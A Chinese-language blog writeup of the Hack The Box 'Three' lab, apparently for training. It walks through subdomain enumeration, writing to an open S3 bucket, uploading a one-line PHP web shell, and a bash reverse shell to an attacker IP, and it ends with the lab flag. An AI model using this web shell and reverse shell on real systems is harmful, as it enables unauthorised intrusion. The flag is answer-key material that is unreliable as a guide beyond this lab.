---
title: HTB Three 靶场 Writeup
date: 2026-08-28 21:15:00
categories:
  - 靶场
tags:
  - HTB
  - Three
  - 靶场
description: HTB Three 靶场 Writeup
---

#### HTB-**Three**

```
echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

nmap

```
nmap -sV 10.129.227.248
```

![image-20260405194534257](/img/htb/htb-three-001.png)

访问ip可知

可以看到一个静态网页，其中有一个演唱会门票预订部分，但它无法使用。查看网页的源代码显示，“联系”表单将请求提交到一个 PHP 页面 /action_page.php，这表明该 web 应用程序的服务器端是使用 PHP 构建的

![image-20260405194952976](/img/htb/htb-three-002.png)

发现一个域名

![image-20260405195059552](/img/htb/htb-three-003.png)

扫子域名（工具：gobuster）

```
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -append-domain
```

![image-20260405201452914](/img/htb/htb-three-004.png)

扫到了：s3.thetoppers.htb和gc._msdcs.thetoppers.htb

添加到主机

```
echo "10.129.62.175 thetoppers.htb s3.thetoppers.htb gc._msdcs.thetoppers.htb" | sudo tee -a /etc/hosts
```

本题提示：访问s3.thetoppers.htb 时，您将看到{"status":"running"}

访问s3.thetoppers.htb

![image-20260405201142501](/img/htb/htb-three-005.png)

**AWS CLI**

通过爆破的子域名，发现的子域上运行的服务进行交互的命令行实用程序是 **AWS CLI**，服务器是Amazon S3，需要安装命令行工具

```text
apt install -y awscli -y
```

安装好之后进行配置(aws configure)

```
aws configure set aws_access_key_id dummy 
aws configure set aws_secret_access_key dummy
aws configure set region us-east-1 
```

接着使用 AWS CLI 连接S3子域。

```
aws --endpoint-url http://s3.thetoppers.htb s3 ls 
```

![image-20260405202350571](/img/htb/htb-three-006.png)

枚举S3存储桶内容

```
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb/
```

![image-20260405202421912](/img/htb/htb-three-007.png)

文件上传漏洞

试一下S3存储桶的写入权限，通过尝试上传一个test文件来进行测试。

```
echo "test" > test.txt
                                                                                            aws --endpoint-url http://s3.thetoppers.htb s3 cp test.txt s3://thetoppers.htb/test.txt
       
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb/ 
```

![image-20260405202722700](/img/htb/htb-three-008.png)

文件上传成功，上传木马

```
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
                                                                                             aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php                                                                                               aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb/
```

使用浏览器打开

```text
http://thetoppers.htb/shell.php?cmd=whoami
```

![image-20260405203401514](/img/htb/htb-three-009.png)

配置反弹shell

配置nc监听

```text
nc -lvnp 4444
```

反弹shell

```text
curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.17.163/4444 0>&1'" "http://thetoppers.htb/shell.php"
```

拿到shell

![image-20260405204238961](/img/htb/htb-three-010.png)

flag：a980d99281a28d638ac68b9bf9453c2b